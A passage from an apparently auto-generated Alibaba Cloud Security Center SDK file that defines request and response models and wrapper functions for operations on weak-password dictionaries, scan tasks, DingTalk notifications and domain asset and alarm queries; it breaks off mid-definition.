 * @return DescribeCustomizedDictUploadInfoResponse
 */
async function describeCustomizedDictUploadInfoWithOptions(request: DescribeCustomizedDictUploadInfoRequest, runtime: Util.RuntimeOptions): DescribeCustomizedDictUploadInfoResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeCustomizedDictUploadInfo',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the Object Storage Service (OSS) information of the file that is uploaded to create custom weak password rules.
 *
 * @param request DescribeCustomizedDictUploadInfoRequest
 * @return DescribeCustomizedDictUploadInfoResponse
 */
async function describeCustomizedDictUploadInfo(request: DescribeCustomizedDictUploadInfoRequest): DescribeCustomizedDictUploadInfoResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeCustomizedDictUploadInfoWithOptions(request, runtime);
}

model DescribeCustomizedStrategyTargetsRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='en'),
  sourceIp?: string(name='SourceIp', description='The source IP address.', example='39.170.43.**'),
}

model DescribeCustomizedStrategyTargetsResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='1EE7B150-D67E-53FD-A52D-3E8E669A****'),
  startegyTargets?: [ 
    {
      groupId?: long(name='GroupId', description='The ID of the server group.

>  You can call the [DescribeAllGroups](~~DescribeAllGroups~~) operation to query the IDs of server groups.', example='14590457'),
      strategyId?: long(name='StrategyId', description='The ID of the baseline check policy.', example='1884'),
      strategyName?: string(name='StrategyName', description='The name of the baseline check policy.', example='win'),
      uuid?: string(name='Uuid', description='The UUID of the server.

>  You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the UUIDs of servers.', example='2701ad2e-0e8f-428c-8812-ebb2686e****'),
    }
  ](name='StartegyTargets', description='The information about the servers to which custom policies are applied.'),
}

model DescribeCustomizedStrategyTargetsResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeCustomizedStrategyTargetsResponseBody(name='body'),
}

/**
 * @summary Queries the servers to which custom policies are applied.
 *
 * @param request DescribeCustomizedStrategyTargetsRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeCustomizedStrategyTargetsResponse
 */
async function describeCustomizedStrategyTargetsWithOptions(request: DescribeCustomizedStrategyTargetsRequest, runtime: Util.RuntimeOptions): DescribeCustomizedStrategyTargetsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeCustomizedStrategyTargets',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the servers to which custom policies are applied.
 *
 * @param request DescribeCustomizedStrategyTargetsRequest
 * @return DescribeCustomizedStrategyTargetsResponse
 */
async function describeCustomizedStrategyTargets(request: DescribeCustomizedStrategyTargetsRequest): DescribeCustomizedStrategyTargetsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeCustomizedStrategyTargetsWithOptions(request, runtime);
}

model DescribeCycleTaskListRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page.', example='20'),
  taskName?: string(name='TaskName', description='The name of the task. Valid values:

*   **VIRUS_VUL_SCHEDULE_SCAN**: virus scan task
*   **IMAGE_SCAN**: image scan task
*   **EMG_VUL_SCHEDULE_SCAN**: urgent vulnerability scan task', example='IMAGE_SCAN'),
  taskType?: string(name='TaskType', description='The type of the task. Valid values:

*   **VIRUS_VUL_SCHEDULE_SCAN**: virus scan task
*   **IMAGE_SCAN**: image scan task
*   **EMG_VUL_SCHEDULE_SCAN**: urgent vulnerability scan task

This parameter is required.', example='IMAGE_SCAN'),
}

model DescribeCycleTaskListResponseBody = {
  cycleScheduleResponseList?: [ 
    {
      configId?: string(name='ConfigId', description='The configuration ID.', example='2cdbdeba8dd70586d5814d4cbf21****'),
      enable?: int32(name='Enable', description='Indicates whether the configuration for the task interval was enabled. Valid values:

*   **1**: enabled.
*   **0**: disabled.', example='1'),
      firstDateStr?: long(name='FirstDateStr', description='The time when the task first started.', example='1667491200000'),
      intervalPeriod?: int32(name='IntervalPeriod', description='The interval between which two consecutive tasks are run.', example='3'),
      lastTaskId?: string(name='LastTaskId', description='The ID of the last task.', example='38730bb078f4a1461d4ed283994c****'),
      nextStartTimeStr?: long(name='NextStartTimeStr', description='The time when the next task starts. The value is a UNIX timestamp. Unit: milliseconds.', example='1671184531000'),
      param?: string(name='Param', description='The extended information.', example='{"userAgreement":"yes","lang":"zh"}'),
      periodUnit?: string(name='PeriodUnit', description='The unit of the scan interval. Valid values:

*   **day**
*   **hour**', example='day'),
      targetEndTime?: int32(name='TargetEndTime', description='The end time of the task. The time must be a time frame.', example='7'),
      targetStartTime?: int32(name='TargetStartTime', description='The start time of the task. The start time must be a time frame.', example='0'),
      taskName?: string(name='TaskName', description='The name of the task.', example='IMAGE_SCAN'),
      taskType?: string(name='TaskType', description='The type of the task.', example='IMAGE_SCAN'),
    }
  ](name='CycleScheduleResponseList', description='An array that consists of periodic scan tasks.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='9'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='149'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='A4EB8B1C-1DEC-5E18-BCD0-D1BBB393****'),
}

model DescribeCycleTaskListResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeCycleTaskListResponseBody(name='body'),
}

/**
 * @summary Queries periodic scan tasks. The tasks include image scan tasks, urgent vulnerability scan tasks, and virus scan tasks.
 *
 * @param request DescribeCycleTaskListRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeCycleTaskListResponse
 */
async function describeCycleTaskListWithOptions(request: DescribeCycleTaskListRequest, runtime: Util.RuntimeOptions): DescribeCycleTaskListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.taskName)) {
    query['TaskName'] = request.taskName;
  }
  if (!Util.isUnset(request.taskType)) {
    query['TaskType'] = request.taskType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeCycleTaskList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries periodic scan tasks. The tasks include image scan tasks, urgent vulnerability scan tasks, and virus scan tasks.
 *
 * @param request DescribeCycleTaskListRequest
 * @return DescribeCycleTaskListResponse
 */
async function describeCycleTaskList(request: DescribeCycleTaskListRequest): DescribeCycleTaskListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeCycleTaskListWithOptions(request, runtime);
}

model DescribeDataSourceRequest {
  configType?: string(name='ConfigType', description='The method that is used to send alert notifications. Set the value to DingTalk.', example='DingTalk'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  sourceIp?: string(name='SourceIp', description='The source IP address.', example='39.155.*.*'),
}

model DescribeDataSourceResponseBody = {
  metaDatas?: [ 
    {
      dataSourceId?: int32(name='DataSourceId', description='The ID of the data source.', example='1753'),
      dataSourceName?: string(name='DataSourceName', description='The name of the data source.', example='sas_analysis_pre-sas-operation-log-sas-event-suspicious'),
      description?: string(name='Description', description='The description of the data source.', example='dingtalk_suspicious'),
      metaDataFields?: [ 
        {
          filed?: string(name='Filed', description='The key of the field.', example='type'),
          filedName?: string(name='FiledName', description='The name of the field.', example='dingtalk_vul_type'),
          operatorList?: [ 
            {
              description?: string(name='Description', description='The description of the operator.', example='dingtalk_vul'),
              name?: string(name='Name', description='The name of the operator.', example='regex'),
            }
          ](name='OperatorList', description='The operators.'),
          sample?: string(name='Sample', description='The sample field.', example='all:dingtalk_all;cms:dingtalk_vul_cms;oval:dingtalk_vul_cve;sys:dingtalk_vul_sys;emg:dingtalk_vul_emg'),
          valueType?: string(name='ValueType', description='The value type of the field.', example='string'),
        }
      ](name='MetaDataFields', description='The metadata files.'),
    }
  ](name='MetaDatas', description='The metadata of the data sources.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7532B7EE-7CE7-5F4D-BF04-B12447DDXXXX'),
}

model DescribeDataSourceResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeDataSourceResponseBody(name='body'),
}

/**
 * @summary Queries data sources for DingTalk notifications. You can configure the types of alerts for which you want to use a DingTalk chatbot to send notifications based on the data sources.
 *
 * @param request DescribeDataSourceRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeDataSourceResponse
 */
async function describeDataSourceWithOptions(request: DescribeDataSourceRequest, runtime: Util.RuntimeOptions): DescribeDataSourceResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.configType)) {
    query['ConfigType'] = request.configType;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeDataSource',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries data sources for DingTalk notifications. You can configure the types of alerts for which you want to use a DingTalk chatbot to send notifications based on the data sources.
 *
 * @param request DescribeDataSourceRequest
 * @return DescribeDataSourceResponse
 */
async function describeDataSource(request: DescribeDataSourceRequest): DescribeDataSourceResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeDataSourceWithOptions(request, runtime);
}

model DescribeDefaultKeyInfoRequest {
  sourceIp?: string(name='SourceIp', description='The source IP address.', example='58.246.73.***'),
}

model DescribeDefaultKeyInfoResponseBody = {
  domainList?: [ string ](name='DomainList', description='The domain names.'),
  names?: string(name='Names', description='The company name.', example='Test'),
  requestId?: string(name='RequestId', description='The request ID.', example='BE120DAB-F4E7-4C53-ADC3-A97578A****'),
}

model DescribeDefaultKeyInfoResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeDefaultKeyInfoResponseBody(name='body'),
}

/**
 * @summary Queries the keywords of a custom dictionary that is generated by using weak passwords.
 *
 * @param request DescribeDefaultKeyInfoRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeDefaultKeyInfoResponse
 */
async function describeDefaultKeyInfoWithOptions(request: DescribeDefaultKeyInfoRequest, runtime: Util.RuntimeOptions): DescribeDefaultKeyInfoResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeDefaultKeyInfo',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the keywords of a custom dictionary that is generated by using weak passwords.
 *
 * @param request DescribeDefaultKeyInfoRequest
 * @return DescribeDefaultKeyInfoResponse
 */
async function describeDefaultKeyInfo(request: DescribeDefaultKeyInfoRequest): DescribeDefaultKeyInfoResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeDefaultKeyInfoWithOptions(request, runtime);
}

model DescribeDefaultProxyInstallVersionResponseBody = {
  installVersion?: string(name='InstallVersion', description='The default installation version.', example='proxy_01_03'),
  requestId?: string(name='RequestId', description='The request ID.', example='F9FCB51A-5078-5D31-9C4D-3B25BEF068C7'),
}

model DescribeDefaultProxyInstallVersionResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeDefaultProxyInstallVersionResponseBody(name='body'),
}

/**
 * @summary Queries the default installation version of the proxy that is used in hybrid-cloud scenarios.
 *
 * @param request DescribeDefaultProxyInstallVersionRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeDefaultProxyInstallVersionResponse
 */
async function describeDefaultProxyInstallVersionWithOptions(runtime: Util.RuntimeOptions): DescribeDefaultProxyInstallVersionResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeDefaultProxyInstallVersion',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the default installation version of the proxy that is used in hybrid-cloud scenarios.
 *
 * @return DescribeDefaultProxyInstallVersionResponse
 */
async function describeDefaultProxyInstallVersion(): DescribeDefaultProxyInstallVersionResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeDefaultProxyInstallVersionWithOptions(runtime);
}

model DescribeDingTalkRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return.Default value: 1.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page.Default value: 20.', example='20'),
  ruleActionName?: string(name='RuleActionName', description='The name of the notification.', example='Vulnerability notification'),
}

model DescribeDingTalkResponseBody = {
  actionList?: [ 
    {
      actionName?: string(name='ActionName', description='The name of the notification.', example='Alert notification'),
      aliUid?: long(name='AliUid', description='The UID of the user.', example='12312412341'),
      configList?: string(name='ConfigList', description='The list of notification settings.', example='[{\\\\"type\\\\":\\\\"vul\\\\",\\\\"configItemList\\\\":[{\\\\"key\\\\":\\\\"key\\\\", \\\\"valueList\\\\":\\\\"123\\\\"}]}]'),
      dingTalkLang?: string(name='DingTalkLang', description='The language of the content within notifications. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
      gmtCreate?: long(name='GmtCreate', description='The creation time. unit:millisecond.', example='1550828400000'),
      gmtModified?: long(name='GmtModified', description='The modification time.', example='1550828400000'),
      groupIdList?: string(name='GroupIdList', description='The group IDs.', example='"123,456"'),
      id?: int32(name='Id', description='The ID of the notification.', example='1'),
      intervalTime?: int32(name='IntervalTime', description='The interval at which the notifications are sent.unit:minute.', example='1000'),
      status?: int32(name='Status', description='The status of the notification. Valid values:

*   **0**: disabled
*   **1**: enabled', example='1'),
      url?: string(name='Url', description='The parameters of the notification.', example='https://oapi.dingtalk.com/robot/send'),
    }
  ](name='ActionList', description='An array that consists of details of notifications.'),
  pageInfo?: {
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of messages.', example='1'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='B256A525-7E42-4BB9-A27C-9017FDDFF1A2'),
}

model DescribeDingTalkResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeDingTalkResponseBody(name='body'),
}

/**
 * @summary Obtains DingTalk notifications.
 *
 * @param request DescribeDingTalkRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeDingTalkResponse
 */
async function describeDingTalkWithOptions(request: DescribeDingTalkRequest, runtime: Util.RuntimeOptions): DescribeDingTalkResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.ruleActionName)) {
    query['RuleActionName'] = request.ruleActionName;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeDingTalk',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Obtains DingTalk notifications.
 *
 * @param request DescribeDingTalkRequest
 * @return DescribeDingTalkResponse
 */
async function describeDingTalk(request: DescribeDingTalkRequest): DescribeDingTalkResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeDingTalkWithOptions(request, runtime);
}

model DescribeDomainCountRequest {
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='192.172.XX.XX'),
}

model DescribeDomainCountResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='C286491D-4A2F-589A-B63B-D2AD3DA9BD71'),
  rootDomainsCount?: int32(name='RootDomainsCount', description='The number of root domains.', example='5'),
  subDomainsCount?: int32(name='SubDomainsCount', description='The number of subdomains.', example='5'),
  totalDomainsCount?: int32(name='TotalDomainsCount', description='The total number of entries returned.', example='10'),
}

model DescribeDomainCountResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeDomainCountResponseBody(name='body'),
}

/**
 * @summary Queries the number of domain assets within your Alibaba Cloud account.
 *
 * @param request DescribeDomainCountRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeDomainCountResponse
 */
async function describeDomainCountWithOptions(request: DescribeDomainCountRequest, runtime: Util.RuntimeOptions): DescribeDomainCountResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeDomainCount',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the number of domain assets within your Alibaba Cloud account.
 *
 * @param request DescribeDomainCountRequest
 * @return DescribeDomainCountResponse
 */
async function describeDomainCount(request: DescribeDomainCountRequest): DescribeDomainCountResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeDomainCountWithOptions(request, runtime);
}

model DescribeDomainDetailRequest {
  domainName?: string(name='DomainName', description='The domain name or the name of website that you want to query.

>  Fuzzy match is not supported. You must enter a complete domain name or a website.

This parameter is required.', example='example.com'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='1.2.XX.XX'),
}

model DescribeDomainDetailResponseBody = {
  alarmCount?: int32(name='AlarmCount', description='The total number of alerts in your website assets.', example='2'),
  domain?: string(name='Domain', description='The domain name.', example='example.com'),
  domainDetailItems?: [ 
    {
      assetType?: string(name='AssetType', description='The type of the domain asset. Valid values:

*   **0**: an Elastic Compute Service (ECS) instance
*   **1**: a Server Load Balancer (SLB) instance
*   **2**: a Network Address Translation (NAT) gateway
*   **3**: an ApsaraDB RDS instance
*   **4**: an ApsaraDB for MongoDB instance', example='0'),
      instanceId?: string(name='InstanceId', description='The instance ID of the asset.', example='i-m5e6w7dzsktt6mz4***'),
      instanceName?: string(name='InstanceName', description='The name of the asset.', example='iZm5e6w7dzsktt6mz4yimeZ-6****'),
      internetIp?: string(name='InternetIp', description='The public IP address of the asset.', example='1.2.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the asset.', example='1.2.XX.XX'),
      uuid?: string(name='Uuid', description='The instance UUID of the domain asset.', example='lb-bp1g9dohoyin9cjhn6****'),
    }
  ](name='DomainDetailItems', description='An array that consists of the details about the domain asset.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='3A85CFCF-05C8-451A-9E41-C0D5E96BA407'),
  rootDomain?: string(name='RootDomain', description='The name of the root domain that corresponds to the domain.', example='example.com'),
  vulCount?: int32(name='VulCount', description='The total number of vulnerabilities in your website assets.', example='2'),
}

model DescribeDomainDetailResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeDomainDetailResponseBody(name='body'),
}

/**
 * @summary Queries the details of domain assets within your Alibaba Cloud account.
 *
 * @param request DescribeDomainDetailRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeDomainDetailResponse
 */
async function describeDomainDetailWithOptions(request: DescribeDomainDetailRequest, runtime: Util.RuntimeOptions): DescribeDomainDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.domainName)) {
    query['DomainName'] = request.domainName;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeDomainDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the details of domain assets within your Alibaba Cloud account.
 *
 * @param request DescribeDomainDetailRequest
 * @return DescribeDomainDetailResponse
 */
async function describeDomainDetail(request: DescribeDomainDetailRequest): DescribeDomainDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeDomainDetailWithOptions(request, runtime);
}

model DescribeDomainListRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  domainType?: string(name='DomainType', description='The type of the domain name that you want to query. Valid values:

*   **root**: root domain name
*   **sub**: subdomain name', example='root'),
  fuzzyDomain?: string(name='FuzzyDomain', description='The keyword that is used to query domain names. Fuzzy match is supported.', example='sas'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **10**.', example='10'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='192.122.XX.XX'),
}

model DescribeDomainListResponseBody = {
  domainListResponseList?: [ 
    {
      domain?: string(name='Domain', description='The name of the domain or website.', example='example.com'),
      ipList?: string(name='IpList', description='The IP addresses of the domain name.', example='1.2.XX.XX,1.0.XX.XX'),
    }
  ](name='DomainListResponseList', description='An array that consists of the information about domain names.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='10'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='10'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: **10**.', example='10'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='27'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='0B48AB3C-84FC-424D-A01D-B9270EF46038'),
}

model DescribeDomainListResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeDomainListResponseBody(name='body'),
}

/**
 * @summary Queries the information about the domain assets within your Alibaba Cloud account.
 *
 * @param request DescribeDomainListRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeDomainListResponse
 */
async function describeDomainListWithOptions(request: DescribeDomainListRequest, runtime: Util.RuntimeOptions): DescribeDomainListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.domainType)) {
    query['DomainType'] = request.domainType;
  }
  if (!Util.isUnset(request.fuzzyDomain)) {
    query['FuzzyDomain'] = request.fuzzyDomain;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeDomainList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the information about the domain assets within your Alibaba Cloud account.
 *
 * @param request DescribeDomainListRequest
 * @return DescribeDomainListResponse
 */
async function describeDomainList(request: DescribeDomainListRequest): DescribeDomainListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeDomainListWithOptions(request, runtime);
}

model DescribeDomainSecureAlarmListRequest {
  from?: string(name='From', description='The identifier of the request source. Set the value to sas.', example='sas'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  sourceIp?: string(name='SourceIp', description='The source IP address.', example='139.227.*.*'),
}

model DescribeDomainSecureAlarmListResponseBody = {
  alarmList?: [ 
    {
      alarmEventName?: string(name='AlarmEventName', description='The name of the alert event.', example='Trojan'),
      alarmEventNameOriginal?: string(name='AlarmEventNameOriginal', description='The original parent name of the alert event.', example='login_common_location'),
      alarmEventType?: string(name='AlarmEventType', description='The type of the alert event.', example='Malicious Software'),
      alarmUniqueInfo?: string(name='AlarmUniqueInfo', description='The unique ID of the alert event.', example='8df914418f4211fbf756efe7a6f4****'),
      autoBreaking?: boolean(name='AutoBreaking', description='Indicates whether automatic defense is enabled.', example='true'),
      canBeDealOnLine?: boolean(name='CanBeDealOnLine', description='Indicates whether the alert event can be handled online, such as quarantining the source file of the malicious process, adding the alert event to the whitelist, and ignoring the alert event. Valid values:

*   **true**
*   **false**', example='true'),
      canCancelFault?: boolean(name='CanCancelFault', description='Indicates whether you can cancel marking the alert event as a false positive. Valid values:

*   **true**
*   **false**', example='false'),
      containHwMode?: boolean(name='ContainHwMode', description='Indicates whether the safeguard mode for major activities is supported.', example='true'),
      dataSource?: string(name='DataSource', description='The data source of the alert event.', example='aegis_****'),
      dealed?: boolean(name='Dealed', description='Indicates whether the alert event is handled. Valid values:

*   **N**: unhandled
*   **Y**: handled', example='y'),
      description?: string(name='Description', description='The description of the alert event.', example='The detection model finds that there is a Trojan horse program on your server. The Trojan horse program is a program specially used to invade the user\\\\"s host. Generally, it will download and release another malicious program after being implanted into the system through disguise.'),
      endTime?: long(name='EndTime', description='The timestamp generated when the alert event was last detected. Unit: milliseconds.', example='1543740301000'),
      gmtModified?: long(name='GmtModified', description='The time of the last modification.', example='1656901794000'),
      hasTraceInfo?: boolean(name='HasTraceInfo', description='Indicates whether the alert event has tracing information. Valid values:

*   **true**
*   **false**', example='true'),
      instanceId?: string(name='InstanceId', description='The instance ID of the affected asset.', example='i-e****'),
      instanceName?: string(name='InstanceName', description='The instance name of the affected asset.', example='TestInstance'),
      internetIp?: string(name='InternetIp', description='The public IP address of the server.', example='95.214.*.*'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the affected instance.', example='192.168.XX.XX'),
      level?: string(name='Level', description='The risk level of the alert event. Valid values:

*   **serious**
*   **suspicious**
*   **remind**', example='serious'),
      operateErrorCode?: string(name='OperateErrorCode', description='The handling result code of the alert event.', example='kill_and_quara.Success'),
      operateTime?: long(name='OperateTime', description='The timestamp generated when the alert event was handled. Unit: milliseconds.', example='1631699497000'),
      saleVersion?: string(name='SaleVersion', description='The edition of Security Center in which the alert event can be detected. Valid values:

